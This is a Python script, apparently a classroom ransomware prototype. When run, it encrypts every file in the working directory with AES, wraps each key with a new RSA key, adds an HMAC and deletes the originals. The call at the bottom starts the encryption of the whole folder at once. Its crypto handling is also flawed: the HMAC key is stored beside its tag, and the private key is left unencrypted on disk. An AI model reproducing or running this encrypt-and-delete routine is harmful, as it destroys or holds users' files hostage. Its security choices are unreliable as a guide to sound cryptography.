import base64
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding,  hashes, hmac, serialization
import cryptography.hazmat.primitives as p
from cryptography.hazmat.primitives.asymmetric import rsa, padding
import json


keySize = 32
ivSize = 16
blockSize = 128


def fileEncrypt(filepath):
    with open(filepath, "rb") as imageFile:
        fileStr = base64.b64encode(imageFile.read())        #opens file and reads as string, converts to b64 encoding
    filename, extension = os.path.splitext(filepath)        #get file name and file extension
    key = os.urandom(keySize)                               #generate key
    iv = os.urandom(ivSize)                                 #generate iv
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())    #create cipher object using AES in CBC mode using the generated key and iv
    encryptor = cipher.encryptor()                          #create encryptor object
    padder = p.padding.PKCS7(blockSize).padder()              #create padder object using PKCS7, blocksize = 128
    padded_data = padder.update(fileStr) + padder.finalize()    #pad fileStr, which is the file read as string
    ct = encryptor.update(padded_data) + encryptor.finalize()   #create ciphertext, padded fileStr after encryption
    encodedCT = base64.encodestring(ct)                     #byte to base64
    asciiCT = encodedCT.decode('ascii')                     #base64 to ascii so JSON will accept it
    encodedIV = base64.encodestring(iv)
    asciiIV = encodedIV.decode('ascii')
    encodedKey = base64.encodestring(key)
    asciiKey = encodedKey.decode('ascii')
    data = {'Cipher' : asciiCT, 'IV': asciiIV, 'Key': asciiKey, 'FileExtension': extension, 'FileName': filename}   #create dictionary with our values
    jsonData = json.dumps(data)  # dictionary to json
    jsonFile = filename+".json"
    with open(jsonFile, 'w') as outfile:  # write to JSON file
        json.dump(jsonData, outfile)
    return jsonFile


def rsaEncryption(publicKey, jsonFile):
    with open(jsonFile) as json_data:
        data = json.load(json_data)
        d = json.loads(data)                    #open JSON file and put it into dictionary
    json_data.close()
    asciiKey = d['Key']                       #get encryption key
    decodedKey = asciiKey.encode('ascii')   #ascii to b64
    key = base64.decodestring(decodedKey)   #b64 to bytes
    ct = publicKey.encrypt(key, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)) #encrypt key
    encodedCT = base64.encodestring(ct)  # byte to base64
    asciiCT = encodedCT.decode('ascii')  # base64 to ascii so JSON will accept it
    d['Key'] = asciiCT              #update dictionary with encrypted key
    jsonData = json.dumps(d)  # dictionary to json
    with open(jsonFile, "w") as rewriteFile:
        json.dump(jsonData, rewriteFile)        #write new json data to file
    rewriteFile.close()
    return jsonFile

def HMACGeneration(jsonFile):
    HMACKey = os.urandom(keySize)                     #generate HMAC key
    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())          #create hash algorithm object
    with open(jsonFile) as json_data:
        data = json.load(json_data)
        d = json.loads(data)                    #open JSON file and put it into dictionary
    json_data.close()                           #close JSON file
    asciiCT = d['Cipher']                       #get encrypted cipher
    decodedCT = asciiCT.encode('ascii')         #ascii to b64
    ct = base64.decodestring(decodedCT)         #b64 to bytes
    h.update(ct)                                #bytes to hash and authenticate
    digest = h.finalize()                       #finalize hash and return digest as bytes
    encodedDigest = base64.encodestring(digest) #digest bytes to b64
    asciiDigest = encodedDigest.decode('ascii') #digest b64 to ascii
    encodedKey = base64.encodestring(HMACKey)   #key bytes to b64
    asciiKey = encodedKey.decode('ascii')       #key b64 to bytes
    d['Tag'] = asciiDigest                      #add digest to dictionary
    d['HMACKey'] = asciiKey                     #add HMAC key to dictionary
    jsonData = json.dumps(d)  # dictionary to json
    with open(jsonFile, 'w') as outfile:  # write to JSON file
        json.dump(jsonData, outfile)

def folderEncrypt():
    privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())      #generate private key
    publicKey = privateKey.public_key()              #generate public key
    for filename in os.listdir(os.getcwd()):        #for all files in pwd
        if(filename != 'finalEncryption'):          #do not encrypt executable file
            filename = os.getcwd() + '/' + filename             #create full filepath
            HMACGeneration(rsaEncryption(publicKey,fileEncrypt(filename)))      #encrypt and HMAC file
            os.remove(filename)                                                 #delete original file
    privatePEM = privateKey.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())    #generate private key PEM file
    privatePEMFile = open("private_key.pem", 'wb')
    privatePEMFile.write(privatePEM)                    #write private key to PEM file
    publicPEM = publicKey.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) #generate public key PEM file
    publicPEMFile = open("public_key.pem", 'wb')
    publicPEMFile.write(publicPEM)              #write public key to PEM file

folderEncrypt()